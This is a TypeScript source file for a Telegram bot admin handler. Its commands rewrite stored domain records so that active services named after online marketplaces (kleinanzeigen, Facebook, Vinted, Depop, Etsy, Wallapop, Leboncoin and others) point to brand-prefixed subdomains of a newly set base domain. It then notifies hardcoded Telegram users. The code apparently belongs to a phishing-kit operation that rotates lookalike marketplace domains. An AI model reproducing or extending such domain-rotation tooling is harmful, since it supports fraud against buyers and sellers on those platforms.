import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {domensRepository, proDomensRepository, userRepository} from "@/database";
import moment from "moment/moment";
import {config} from "@/utils/config";
import console from "console";
import {updateSmsDomen} from "@/handlers/admins/domens/setDomen";

const regex = /\/set maindomen (?<link>.+)/gmsi
const regexEtsyDomen = /\/set etsydomen (?<link>.+)/gmsi
const regexPro = /\/set prodomen (?<link>.+)/gmsi
export const composer = new Composer<Context>()
composer.hears(regex, handler)
composer.hears(regexEtsyDomen, handlerEtsy)
composer.hears(regexPro, handler)

async function handler(ctx: Context)  {
    console.log("asd")
    const match = regex.exec(ctx.message.text)
    const matchPro = regexPro.exec(ctx.message.text)

    let link = undefined
    let isPro = false

    if (match?.groups?.link) {
        link = match?.groups?.link
    }

    if (matchPro?.groups?.link) {
        isPro = true
        link = matchPro?.groups?.link
    }

    if (!isPro) {
        const domens = await domensRepository.find()
        for (const i in domens) {
            const domen = domens[i]

            if (domen.service === 'ebay' && domen.active) {
                domens[i].link = `kleinanzeigen.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'facebook' && domen.active) {
                domens[i].link = `facebook.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'paysend' && domen.active) {
                domens[i].link = `paysend.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'leboncoin' && domen.active) {
                domens[i].link = `leboncoin.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }

            if (domen.service === 'etsy' && domen.active) {
                domens[i].link = `etsy.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }

            if (domen.service === 'lonelypups' && domen.active && !domen.special) {
                domens[i].link = `lonelypups.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'jofogas' && domen.active) {
                domens[i].link = `jofogas.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'wallapop' && domen.active) {
                domens[i].link = `wallapop.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'vinted' && domen.active) {
                domens[i].link = `vinted.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'depop' && domen.active) {
                domens[i].link = `depop.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'willhaben' && domen.active) {
                domens[i].link = `willhaben.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
        }
        await domensRepository.save(domens)
        await ctx.api.sendMessage(config.chats.chat, `⚠️ Все домены были обновлены!`)
        await ctx.api.sendMessage(5933718791, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`)
        await updateSmsDomen()
        return ctx.api.sendMessage(5685044944, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`)
    }

    if (isPro) {
        const domens = await proDomensRepository.find()
        for (const i in domens) {
            const domen = domens[i]

            if (domen.service === 'ebay' && domen.active) {
                domens[i].link = `kleinanzeigen.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'facebook' && domen.active) {
                domens[i].link = `facebook.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'jofogas' && domen.active) {
                domens[i].link = `jofogas.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'vinted' && domen.active) {
                domens[i].link = `vinted.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
            if (domen.service === 'depop' && domen.active) {
                domens[i].link = `depop.${link}`
                domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
            }
        }
        await proDomensRepository.save(domens)
        await ctx.api.sendMessage(config.chats.chat, `⚠️ <b>[PRO]</b> Все домены были обновлены!`)
        await ctx.api.sendMessage(5933718791, `⚠️ <b>[PRO]</b> Все домены были обновлены!\n\nNew Link: ${link}`)
        await updateSmsDomen()
        return ctx.api.sendMessage(5685044944, `⚠️ <b>[PRO]</b> Все домены были обновлены!\n\nNew Link: ${link}`)
    }

}
async function handlerEtsy(ctx: Context)  {
    const match = regexEtsyDomen.exec(ctx.message.text)

    let link = undefined

    if (match?.groups?.link) {
        link = match?.groups?.link
    }

    const domens = await domensRepository.find()
    for (const i in domens) {
        const domen = domens[i]

        if (domen.service === 'etsy' && domen.active) {
            domens[i].link = `etsy.${link}`
            domens[i].dateChange = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')
        }
    }
    await domensRepository.save(domens)
    await ctx.api.sendMessage(config.chats.chat, `⚠️ Все домены были обновлены!`)
    await ctx.api.sendMessage(5933718791, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`)
    await updateSmsDomen()
    return ctx.api.sendMessage(5685044944, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`)

}